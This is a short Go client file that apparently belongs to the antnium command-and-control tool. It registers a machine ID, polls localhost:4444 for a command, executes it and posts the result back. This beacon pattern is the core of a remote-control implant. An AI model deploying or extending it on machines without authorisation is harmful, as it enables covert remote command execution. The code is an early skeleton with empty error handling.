package client

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/dobin/antnium/model"
	"github.com/google/uuid"
)

type Client struct {
	port       int
	computerId string
}

func NewClient(port int) Client {
	w := Client{port, uuid.New().String()}
	return w
}

func (s Client) Start() {
	fmt.Println("Client")

	s.sendPing()
	command := s.getCommand()
	command.Execute()
	s.sendCommand(command)
}

func (s Client) sendPing() {
	pingCommand := model.NewCommandPing(s.computerId, "0", "ooy!")
	s.sendCommand(pingCommand)
}

func (s Client) getCommand() model.Command {
	resp, err := http.Get("http://localhost:4444/getCommand/" + s.computerId)
	if err != nil {
		// handle error
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	bodyString := string(bodyBytes)

	fmt.Println("<- " + bodyString)

	command := model.JsonToCommand(bodyString)
	return command
}

func (s Client) sendCommand(command model.Command) {
	command.SetComputerId(s.computerId)

	json, err := json.Marshal(command)
	if err != nil {
		panic(err)
	}
	url := "http://localhost:4444/sendCommand"
	fmt.Println("-> " + string(json))
	var jsonStr = json
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		// handle error
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
	}
}
